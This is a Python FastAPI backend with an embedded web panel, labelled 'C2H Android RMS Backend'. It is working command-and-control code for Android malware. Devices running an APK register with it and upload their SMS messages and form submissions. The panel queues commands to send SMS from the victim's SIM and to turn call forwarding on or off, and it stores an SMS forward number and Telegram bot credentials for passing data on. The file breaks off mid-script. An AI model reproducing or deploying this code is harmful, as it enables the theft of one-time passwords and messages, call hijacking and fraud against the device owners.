import uvicorn
from fastapi import FastAPI, HTTPException, Request
from pydantic import BaseModel
from typing import List, Optional, Dict, Any
from datetime import datetime, timedelta, timezone
import sqlite3
import json
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
import os

# --- Configuration ---
DATABASE_URL = "rms.db"
ONLINE_THRESHOLD_SECONDS = 20

# --- Database Initialization ---
def get_db_connection():
    conn = sqlite3.connect(DATABASE_URL, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def now_utc_string():
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT UNIQUE NOT NULL,
            device_name TEXT,
            os_version TEXT,
            phone_number TEXT,
            battery_level INTEGER,
            last_seen DATETIME NOT NULL,
            created_at DATETIME NOT NULL
        );
    """)
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_device_id ON devices (device_id);")

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            command_type TEXT NOT NULL,
            command_data TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'pending',
            created_at DATETIME NOT NULL
        );
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS sms_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            sender TEXT NOT NULL,
            message_body TEXT NOT NULL,
            received_at DATETIME NOT NULL
        );
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS form_submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            custom_data TEXT NOT NULL,
            submitted_at DATETIME NOT NULL
        );
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS global_settings (
            setting_key TEXT PRIMARY KEY UNIQUE NOT NULL,
            setting_value TEXT
        );
    """)
    
    # Default settings
    cursor.execute("INSERT OR IGNORE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
                  ('sms_forward_number', '9923255555'))
    cursor.execute("INSERT OR IGNORE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
                  ('telegram_bot_token', ''))
    cursor.execute("INSERT OR IGNORE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
                  ('telegram_chat_id', ''))
    
    conn.commit()
    conn.close()

init_db()

# --- Pydantic Models ---
class DeviceRegisterRequest(BaseModel):
    device_id: str
    device_name: Optional[str] = None
    os_version: Optional[str] = None
    phone_number: Optional[str] = None
    battery_level: Optional[int] = None

class DeviceResponse(BaseModel):
    device_id: str
    device_name: Optional[str] = None
    os_version: Optional[str] = None
    phone_number: Optional[str] = None
    battery_level: Optional[int] = None
    is_online: bool
    created_at: str
    last_seen: str

class SmsForwardConfigRequest(BaseModel):
    forward_number: str

class TelegramConfigRequest(BaseModel):
    telegram_bot_token: str
    telegram_chat_id: str

class SendCommandRequest(BaseModel):
    device_id: str
    command_type: str
    command_data: Dict[str, Any]

class FormSubmissionRequest(BaseModel):
    custom_data: str

class SmsLogRequest(BaseModel):
    sender: str
    message_body: str

# --- FastAPI Application ---
app = FastAPI(
    title="C2H Android RMS Backend",
    description="Complete Web Panel for Device Control",
    version="3.0.0"
)

# --- API Endpoints ---

@app.get("/api/device/register")
@app.post("/api/device/register")
async def register_device(data: Optional[DeviceRegisterRequest] = None, request: Request = None):
    """डिवाइस रजिस्टर करें"""
    if request.method == "GET":
        return {"status": "ok", "message": "Use POST to register device"}
    
    if not data:
        try:
            data = DeviceRegisterRequest(**await request.json())
        except:
            raise HTTPException(status_code=400, detail="Invalid data")
    
    conn = get_db_connection()
    cursor = conn.cursor()
    current_time_str = now_utc_string()
    clean_device_id = data.device_id.strip()

    cursor.execute("SELECT id FROM devices WHERE device_id = ?", (clean_device_id,))
    device = cursor.fetchone()
    
    if device:
        cursor.execute(
            """
            UPDATE devices 
            SET device_name = ?, os_version = ?, phone_number = ?, battery_level = ?, last_seen = ?
            WHERE device_id = ?
            """,
            (
                data.device_name, data.os_version, data.phone_number, 
                data.battery_level, current_time_str, clean_device_id
            )
        )
    else:
        cursor.execute(
            """
            INSERT INTO devices 
            (device_id, device_name, os_version, phone_number, battery_level, last_seen, created_at) 
            VALUES (?, ?, ?, ?, ?, ?, ?)
            """,
            (
                clean_device_id, data.device_name, data.os_version, 
                data.phone_number, data.battery_level, current_time_str, current_time_str
            )
        )
        
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Device data updated successfully."}

@app.get("/api/devices", response_model=List[DeviceResponse])
async def get_devices():
    """सभी डिवाइस की लिस्ट लें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM devices ORDER BY last_seen DESC")
    devices = cursor.fetchall()
    response_list = []
    current_time_utc = datetime.now(timezone.utc)
    for device in devices:
        try:
            last_seen_dt = datetime.strptime(device['last_seen'], "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
        except (ValueError, TypeError):
            last_seen_dt = current_time_utc - timedelta(days=1)
        is_online = (current_time_utc - last_seen_dt).total_seconds() < ONLINE_THRESHOLD_SECONDS
        response_list.append(DeviceResponse(
            device_id=device['device_id'],
            device_name=device['device_name'] or "Unknown Device",
            os_version=device['os_version'] or "Unknown",
            phone_number=device['phone_number'] or "No Number",
            battery_level=device['battery_level'] or 0,
            is_online=is_online,
            created_at=device['created_at'],
            last_seen=device['last_seen']
        ))
    conn.close()
    return response_list

@app.post("/api/config/sms_forward")
async def update_sms_forward_config(data: SmsForwardConfigRequest):
    """SMS फॉरवर्ड नंबर अपडेट करें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
        ('sms_forward_number', data.forward_number)
    )
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Forwarding number updated."}

@app.post("/api/config/telegram")
async def update_telegram_config(data: TelegramConfigRequest):
    """टेलीग्राम कॉन्फिग अपडेट करें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
        ('telegram_bot_token', data.telegram_bot_token)
    )
    cursor.execute(
        "INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
        ('telegram_chat_id', data.telegram_chat_id)
    )
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Telegram config updated."}

@app.get("/api/config/sms_forward")
async def get_sms_forward_config():
    """SMS फॉरवर्ड नंबर लें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT setting_value FROM global_settings WHERE setting_key = ?", ('sms_forward_number',))
    result = cursor.fetchone()
    conn.close()
    return {"forward_number": result['setting_value'] if result else "9923255555"}

@app.get("/api/config/telegram")
async def get_telegram_config():
    """टेलीग्राम कॉन्फिग लें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT setting_key, setting_value FROM global_settings WHERE setting_key IN ('telegram_bot_token', 'telegram_chat_id')")
    results = {row['setting_key']: row['setting_value'] for row in cursor.fetchall()}
    conn.close()
    return {
        "telegram_bot_token": results.get('telegram_bot_token', ''),
        "telegram_chat_id": results.get('telegram_chat_id', '')
    }

@app.post("/api/command/send")
async def send_command(data: SendCommandRequest):
    """डिवाइस को कमांड भेजें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO commands (device_id, command_type, command_data, created_at) VALUES (?, ?, ?, ?)",
        (data.device_id.strip(), data.command_type, json.dumps(data.command_data), now_utc_string())
    )
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Command sent."}

@app.get("/api/device/{device_id}/commands")
async def get_pending_commands(device_id: str):
    """डिवाइस के पेंडिंग कमांड लें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "SELECT id, command_type, command_data FROM commands WHERE device_id = ? AND status = 'pending'",
        (device_id.strip(),)
    )
    commands = cursor.fetchall()
    command_list = [{"id": cmd['id'], "command_type": cmd['command_type'], "command_data": json.loads(cmd['command_data'])} for cmd in commands]
    if command_list:
        command_ids = [cmd['id'] for cmd in command_list]
        placeholders = ','.join('?' * len(command_ids))
        cursor.execute(f"UPDATE commands SET status = 'sent' WHERE id IN ({placeholders})", command_ids)
        conn.commit()
    conn.close()
    return command_list

@app.post("/api/command/{command_id}/execute")
async def mark_command_executed(command_id: int):
    """कमांड को एक्जीक्यूटेड मार्क करें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("UPDATE commands SET status = 'executed' WHERE id = ?", (command_id,))
    conn.commit()
    conn.close()
    return {"status": "success", "message": f"Command {command_id} executed."}

@app.post("/api/device/{device_id}/forms")
async def submit_form(device_id: str, data: FormSubmissionRequest):
    """फॉर्म डेटा सेव करें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO form_submissions (device_id, custom_data, submitted_at) VALUES (?, ?, ?)",
        (device_id.strip(), data.custom_data, now_utc_string())
    )
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Form data submitted."}

@app.get("/api/device/{device_id}/forms")
async def get_form_submissions(device_id: str):
    """डिवाइस के फॉर्म डेटा लें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT id, custom_data, submitted_at FROM form_submissions WHERE device_id = ? ORDER BY submitted_at DESC", (device_id.strip(),))
    forms = cursor.fetchall()
    conn.close()
    return [{"id": form['id'], "custom_data": form['custom_data'], "submitted_at": form['submitted_at']} for form in forms]

@app.post("/api/device/{device_id}/sms")
async def log_sms(device_id: str, data: SmsLogRequest):
    """SMS लॉग करें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO sms_logs (device_id, sender, message_body, received_at) VALUES (?, ?, ?, ?)",
        (device_id.strip(), data.sender, data.message_body, now_utc_string())
    )
    conn.commit()
    conn.close()
    return {"status": "success", "message": "SMS logged."}

@app.get("/api/device/{device_id}/sms")
async def get_sms_logs(device_id: str):
    """डिवाइस के SMS लॉग लें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT id, sender, message_body, received_at FROM sms_logs WHERE device_id = ? ORDER BY received_at DESC LIMIT 500", (device_id.strip(),))
    sms_logs = cursor.fetchall()
    conn.close()
    return [{"id": sms['id'], "sender": sms['sender'], "message_body": sms['message_body'], "received_at": sms['received_at']} for sms in sms_logs]

@app.delete("/api/device/{device_id}")
async def delete_device(device_id: str):
    """डिवाइस डिलीट करें"""
    conn = get_db_connection()
    cursor = conn.cursor()
    clean_device_id = device_id.strip()
    cursor.execute("SELECT id FROM devices WHERE device_id = ?", (clean_device_id,))
    device = cursor.fetchone()
    if not device:
        conn.close()
        raise HTTPException(status_code=404, detail="Device not found.")
    
    cursor.execute("DELETE FROM devices WHERE device_id = ?", (clean_device_id,))
    cursor.execute("DELETE FROM sms_logs WHERE device_id = ?", (clean_device_id,))
    cursor.execute("DELETE FROM form_submissions WHERE device_id = ?", (clean_device_id,))
    cursor.execute("DELETE FROM commands WHERE device_id = ?", (clean_device_id,))
    conn.commit()
    conn.close()
    return {"status": "success", "message": "Device and all data deleted."}

# --- Web Panel (HTML + CSS + JavaScript) ---

@app.get("/", response_class=HTMLResponse)
async def get_panel():
    """मुख्य पैनल पेज"""
    return HTMLResponse(content="""
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📱 Device Control Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        h1 {
            color: white;
            margin-bottom: 30px;
            font-size: 2.5em;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
        }
        
        .config-section {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 40px;
        }
        
        .config-card {
            background: white;
            padding: 25px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        
        .config-card h3 {
            color: #333;
            margin-bottom: 15px;
            font-size: 1.3em;
        }
        
        .config-card form {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        .config-card input {
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 1em;
            transition: border-color 0.3s;
        }
        
        .config-card input:focus {
            outline: none;
            border-color: #667eea;
        }
        
        .config-card button {
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 1em;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
        }
        
        .config-card button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }
        
        h2 {
            color: white;
            margin: 30px 0 20px;
            font-size: 1.8em;
        }
        
        .device-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
            gap: 20px;
        }
        
        .device-card {
            background: white;
            border-radius: 20px;
            padding: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            cursor: pointer;
            transition: all 0.3s;
            border-left: 5px solid #4caf50;
        }
        
        .device-card.offline {
            border-left-color: #f44336;
            opacity: 0.8;
        }
        
        .device-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(0,0,0,0.3);
        }
        
        .device-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .device-name {
            font-size: 1.2em;
            font-weight: bold;
            color: #333;
        }
        
        .status {
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 0.85em;
            font-weight: bold;
        }
        
        .online .status {
            background: #4caf50;
            color: white;
        }
        
        .offline .status {
            background: #f44336;
            color: white;
        }
        
        .battery {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 15px 0;
        }
        
        .battery-bar {
            flex: 1;
            height: 10px;
            background: #e0e0e0;
            border-radius: 5px;
            overflow: hidden;
        }
        
        .battery-level {
            height: 100%;
            background: #4caf50;
            border-radius: 5px;
            transition: width 0.3s;
        }
        
        .battery-level.low {
            background: #f44336;
        }
        
        .battery-level.medium {
            background: #ff9800;
        }
        
        .device-details {
            color: #666;
            font-size: 0.95em;
            margin: 10px 0;
        }
        
        .device-details p {
            margin: 5px 0;
        }
        
        .last-seen {
            font-size: 0.85em;
            color: #999;
            margin-top: 10px;
        }
        
        .no-devices {
            grid-column: 1 / -1;
            text-align: center;
            padding: 50px;
            background: white;
            border-radius: 20px;
            color: #666;
        }
        
        .delete-btn {
            background: #f44336;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.9em;
            margin-top: 10px;
            width: 100%;
            transition: background 0.3s;
        }
        
        .delete-btn:hover {
            background: #d32f2f;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
            overflow-y: auto;
        }
        
        .modal-content {
            background: white;
            width: 95%;
            max-width: 1200px;
            margin: 30px auto;
            padding: 30px;
            border-radius: 25px;
            position: relative;
        }
        
        .close {
            position: absolute;
            top: 20px;
            right: 30px;
            font-size: 35px;
            cursor: pointer;
            color: #666;
            transition: color 0.3s;
        }
        
        .close:hover {
            color: #333;
        }
        
        .device-title {
            color: #333;
            margin-bottom: 20px;
            padding-right: 40px;
        }
        
        .action-buttons {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 30px 0;
        }
        
        .action-btn {
            padding: 15px;
            border: none;
            border-radius: 12px;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            color: white;
        }
        
        .sms-btn { background: linear-gradient(135deg, #4caf50 0%, #45a049 100%); }
        .call-btn { background: linear-gradient(135deg, #ff9800 0%, #f57c00 100%); }
        .form-btn { background: linear-gradient(135deg, #9c27b0 0%, #7b1fa2 100%); }
        .refresh-btn { background: linear-gradient(135deg, #2196f3 0%, #1976d2 100%); }
        
        .action-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }
        
        .command-form {
            background: #f5f5f5;
            padding: 20px;
            border-radius: 15px;
            margin: 20px 0;
        }
        
        .command-form input, .command-form select, .command-form textarea {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 1em;
        }
        
        .command-form textarea {
            min-height: 100px;
            resize: vertical;
        }
        
        .command-form button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1em;
            cursor: pointer;
            margin-top: 10px;
        }
        
        .tabs {
            display: flex;
            gap: 10px;
            margin: 30px 0 20px;
            flex-wrap: wrap;
        }
        
        .tab {
            padding: 12px 25px;
            background: #f0f0f0;
            border-radius: 25px;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: 500;
        }
        
        .tab:hover {
            background: #e0e0e0;
        }
        
        .tab.active {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .sms-list, .form-list {
            max-height: 500px;
            overflow-y: auto;
            padding: 10px;
        }
        
        .sms-item {
            background: #f9f9f9;
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 10px;
            border-left: 4px solid #4caf50;
        }
        
        .sms-item.sent {
            border-left-color: #ff9800;
        }
        
        .sms-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            color: #666;
            font-size: 0.9em;
        }
        
        .sms-sender {
            font-weight: bold;
            color: #333;
        }
        
        .sms-message {
            color: #444;
            line-height: 1.5;
            white-space: pre-wrap;
        }
        
        .form-item {
            background: #f9f9f9;
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 10px;
            border-left: 4px solid #9c27b0;
        }
        
        .form-date {
            color: #666;
            font-size: 0.9em;
            margin-bottom: 5px;
        }
        
        .form-data {
            color: #333;
            white-space: pre-wrap;
            font-family: monospace;
            background: #f0f0f0;
            padding: 10px;
            border-radius: 8px;
        }
        
        .loading {
            text-align: center;
            padding: 50px;
            color: #666;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading::after {
            content: '';
            display: inline-block;
            width: 30px;
            height: 30px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-left: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📱 Device Control Panel</h1>
        
        <!-- कॉन्फिग सेक्शन -->
        <div class="config-section">
            <div class="config-card">
                <h3>📨 SMS Forward Number</h3>
                <form id="smsForm">
                    <input type="text" id="smsNumber" placeholder="Enter phone number" required>
                    <button type="submit">Update</button>
                </form>
            </div>
            
            <div class="config-card">
                <h3>🤖 Telegram Config</h3>
                <form id="telegramForm">
                    <input type="text" id="botToken" placeholder="Bot Token">
                    <input type="text" id="chatId" placeholder="Chat ID">
                    <button type="submit">Update</button>
                </form>
            </div>
        </div>
        
        <!-- डिवाइस लिस्ट -->
        <h2>📱 Registered Devices <span id="deviceCount">(0)</span></h2>
        <div id="deviceGrid" class="device-grid">
            <div class="loading">Loading devices...</div>
        </div>
    </div>
    
    <!-- डिवाइस डिटेल मोडल -->
    <div id="deviceModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal()">&times;</span>
            <div id="modalContent"></div>
        </div>
    </div>
    
    <script>
        // ग्लोबल वेरिएबल
        let currentDeviceId = null;
        let refreshInterval = null;
        
        // पेज लोड होते ही डिवाइस लोड करें
        document.addEventListener('DOMContentLoaded', function() {
            loadDevices();
            loadConfig();
            
            // हर 5 सेकंड में रिफ्रेश
            refreshInterval = setInterval(loadDevices, 5000);
        });
        
        // कॉन्फिग लोड करें
        async function loadConfig() {
            try {
                // SMS नंबर लोड करें
                const smsRes = await fetch('/api/config/sms_forward');
                const smsData = await smsRes.json();
                document.getElementById('smsNumber').value = smsData.forward_number || '';
                
                // टेलीग्राम कॉन्फिग लोड करें
                const telRes = await fetch('/api/config/telegram');
                const telData = await telRes.json();
                document.getElementById('botToken').value = telData.telegram_bot_token || '';
                document.getElementById('chatId').value = telData.telegram_chat_id || '';
            } catch (error) {
                console.error('Error loading config:', error);
            }
        }
        
        // SMS फॉर्म सबमिट
        document.getElementById('smsForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const number = document.getElementById('smsNumber').value;
            
            try {
                const res = await fetch('/api/config/sms_forward', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({forward_number: number})
                });
                
                if (res.ok) {
                    alert('✅ SMS forward number updated successfully!');
                }
            } catch (error) {
                alert('❌ Error updating SMS number');
            }
        });
        
        // टेलीग्राम फॉर्म सबमिट
        document.getElementById('telegramForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const data = {
                telegram_bot_token: document.getElementById('botToken').value,
                telegram_chat_id: document.getElementById('chatId').value
            };
            
            try {
                const res = await fetch('/api/config/telegram', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                
                if (res.ok) {
                    alert('✅ Telegram config updated successfully!');
                }
            } catch (error) {
                alert('❌ Error updating Telegram config');
            }
        });
        
        // डिवाइस लोड करें
        async function loadDevices() {
            try {
                const res = await fetch('/api/devices');
                const devices = await res.json();
                
                document.getElementById('deviceCount').textContent = `(${devices.length})`;
                
                const grid = document.getElementById('deviceGrid');
                
                if (devices.length === 0) {
                    grid.innerHTML = '<div class="no-devices"><h3>No devices registered yet</h3><p>Install the APK on a device to see it here</p></div>';
                    return;
                }
                
                let html = '';
                devices.forEach(device => {
                    const batteryClass = device.battery_level < 20 ? 'low' : (device.battery_level < 50 ? 'medium' : '');
                    const statusClass = device.is_online ? 'online' : 'offline';
                    
                    html += `
                        <div class="device-card ${statusClass}" onclick="openDeviceModal('${device.device_id}')">
                            <div class="device-header">
                                <span class="device-name">${escapeHtml(device.device_name || 'Unknown')}</span>
                                <span class="status">${device.is_online ? 'ONLINE' : 'OFFLINE'}</span>
                            </div>
                            
                            <div class="battery">
                                <span>🔋</span>
                                <div class="battery-bar">
                                    <div class="battery-level ${batteryClass}" style="width: ${device.battery_level}%;"></div>
                                </div>
                                <span>${device.battery_level}%</span>
                            </div>
                            
                            <div class="device-details">
                                <p>📱 ${escapeHtml(device.os_version || 'Android')}</p>
                                <p>📞 ${escapeHtml(device.phone_number || 'No number')}</p>
                            </div>
                            
                            <div class="last-seen">
                                Last seen: ${escapeHtml(device.last_seen || 'Never')}
                            </div>
                        </div>
                    `;
                });
                
                grid.innerHTML = html;
            } catch (error) {
                console.error('Error loading devices:', error);
                document.getElementById('deviceGrid').innerHTML = '<div class="no-devices">Error loading devices. Please refresh.</div>';
            }
        }
        
        // HTML एस्केप
        function escapeHtml(text) {
            if (!text) return '';
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        // डिवाइस मोडल खोलें
        async function openDeviceModal(deviceId) {
            currentDeviceId = deviceId;
            const modal = document.getElementById('deviceModal');
            const content = document.getElementById('modalContent');
            
            content.innerHTML = '<div class="loading">Loading device details...</div>';
            modal.style.display = 'block';
            
            await loadDeviceDetails(deviceId);
        }
        
        // डिवाइस डिटेल लोड करें
        async function loadDeviceDetails(deviceId) {
            try {
                // डिवाइस की जानकारी
                const devicesRes = await fetch('/api/devices');
                const devices = await devicesRes.json();
                const device = devices.find(d => d.device_id === deviceId);
                
                if (!device) {
                    document.getElementById('modalContent').innerHTML = '<div class="no-devices">Device not found</div>';
                    return;
                }
                
                // SMS लॉग
                const smsRes = await fetch(`/api/device/${deviceId}/sms`);
                const smsLogs = await smsRes.json();
                
                // फॉर्म डेटा
                const formsRes = await fetch(`/api/device/${deviceId}/forms`);
                const formData = await formsRes.json();
                
                let html = `
                    <h2 class="device-title">📱 ${escapeHtml(device.device_name || 'Unknown Device')}</h2>
                    
                    <div class="action-buttons">
                        <button class="action-btn sms-btn" onclick="showSMSForm()">📨 Send SMS</button>
                        <button class="action-btn call-btn" onclick="showCallForm()">📞 Call Forward</button>
                        <button class="action-btn form-btn" onclick="showFormData()">📋 Form Data</button>
                        <button class="action-btn refresh-btn" onclick="refreshDeviceData()">🔄 Refresh</button>
                    </div>
                    
                    <div id="commandFormContainer"></div>
                    
                    <div class="tabs">
                        <div class="tab active" onclick="switchTab('sms')">📨 SMS (${smsLogs.length})</div>
                        <div class="tab" onclick="switchTab('forms')">📋 Forms (${formData.length})</div>
                    </div>
                    
                    <div id="smsTab" class="tab-content active">
                        <div class="sms-list">
                `;
                
                if (smsLogs.length === 0) {
                    html += '<div class="no-devices">No SMS messages yet</div>';
                } else {
                    smsLogs.forEach(sms => {
                        const type = sms.sender === device.phone_number ? 'sent' : 'inbox';
                        html += `
                            <div class="sms-item ${type}">
                                <div class="sms-header">
                                    <span class="sms-sender">${escapeHtml(sms.sender)}</span>
                                    <span>${escapeHtml(sms.received_at)}</span>
                                </div>
                                <div class="sms-message">${escapeHtml(sms.message_body)}</div>
                            </div>
                        `;
                    });
                }
                
                html += `</div></div>`;
                
                html += `
                    <div id="formsTab" class="tab-content">
                        <div class="form-list">
                `;
                
                if (formData.length === 0) {
                    html += '<div class="no-devices">No form submissions yet</div>';
                } else {
                    formData.forEach(form => {
                        html += `
                            <div class="form-item">
                                <div class="form-date">${escapeHtml(form.submitted_at)}</div>
                                <div class="form-data">${escapeHtml(form.custom_data)}</div>
                            </div>
                        `;
                    });
                }
                
                html += `
                        </div>
                    </div>
                    
                    <button class="delete-btn" onclick="deleteDevice()">🗑️ Delete Device</button>
                `;
                
                document.getElementById('modalContent').innerHTML = html;
                
            } catch (error) {
                console.error('Error loading device details:', error);
                document.getElementById('modalContent').innerHTML = '<div class="no-devices">Error loading device details</div>';
            }
        }
        
        // SMS फॉर्म दिखाएँ
        function showSMSForm() {
            const container = document.getElementById('commandFormContainer');
            container.innerHTML = `
                <div class="command-form">
                    <h3>📨 Send SMS</h3>
                    <input type="text" id="smsPhone" placeholder="Phone Number" required>
                    <textarea id="smsMessage" placeholder="Message" required></textarea>
                    <select id="smsSim">
                        <option value="0">SIM 1</option>
                        <option value="1">SIM 2</option>
                    </select>
                    <button onclick="sendSMSCommand()">Send SMS</button>
                </div>
            `;
        }
        
        // कॉल फॉरवर्ड फॉर्म दिखाएँ
        function showCallForm() {
            const container = document.getElementById('commandFormContainer');
            container.innerHTML = `
                <div class="command-form">
                    <h3>📞 Call Forwarding</h3>
                    <select id="callAction">
                        <option value="enable">Enable Forwarding</option>
                        <option value="disable">Disable Forwarding</option>
                    </select>
                    <input type="text" id="forwardNumber" placeholder="Forward to Number (for enable)">
                    <select id="callSim">
                        <option value="0">SIM 1</option>
                        <option value="1">SIM 2</option>
                    </select>
                    <button onclick="sendCallCommand()">Execute</button>
                </div>
            `;
        }
        
        // फॉर्म डेटा दिखाएँ
        function showFormData() {
            const container = document.getElementById('commandFormContainer');
            container.innerHTML = `
                <div class="command-form">
                    <h3>📋 Form Data</h3>
                    <button onclick="refreshDeviceData()">🔄 Refresh Form Data</button>
                </div>
            `;
        }
        
        // SMS कमांड भेजें
        async function sendSMSCommand() {
            const phone = document.getElementById('smsPhone').value;
            const message = document.getElementById('smsMessage').value;
            const sim = document.getElementById('smsSim').value;
            
            if (!phone || !message) {
                alert('Please fill all fields');
                return;
            }
            
            try {
                const res = await fetch('/api/command/send', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        device_id: currentDeviceId,
                        command_type: 'send_sms',
                        command_data: {
                            phone_number: phone,
                            message: message,
                            sim_slot: parseInt(sim)
                        }
                    })
                });
                
                if (res.ok) {
                    alert('✅ SMS command sent to device!');
                    document.getElementById('commandFormContainer').innerHTML = '';
                }
            } catch (error) {
                alert('❌ Error sending command');
            }
        }
        
        // कॉल कमांड भेजें
        async function sendCallCommand() {
            const action = document.getElementById('callAction').value;
            const forwardNumber = document.getElementById('forwardNumber').value;
            const sim = document.getElementById('callSim').value;
            
            if (action === 'enable' && !forwardNumber) {
                alert('Please enter forward number');
                return;
            }
            
            try {
                const commandData = {
                    action: action,
                    sim_slot: parseInt(sim)
                };
                
                if (action === 'enable') {
                    commandData.forward_number = forwardNumber;
                }
                
                const res = await fetch('/api/command/send', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        device_id: currentDeviceId,
                        command_type: 'call_forward',
                        command_data: commandData
                    })
                });
                
                if (res.ok) {
                    alert('✅ Call forward command sent to device!');
                    document.getElementById('commandFormContainer').innerHTML = '';
                }
            } catch (error) {
                alert('❌ Error sending command');
            }
        }
        
        // डिवाइस डेटा रिफ्रेश करें
        async function refreshDeviceData() {
            if (currentDeviceId) {
                await loadDeviceDetails(currentDeviceId);
            }
        }
        
        // टैब स्विच करें
        function switchTab(tab) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
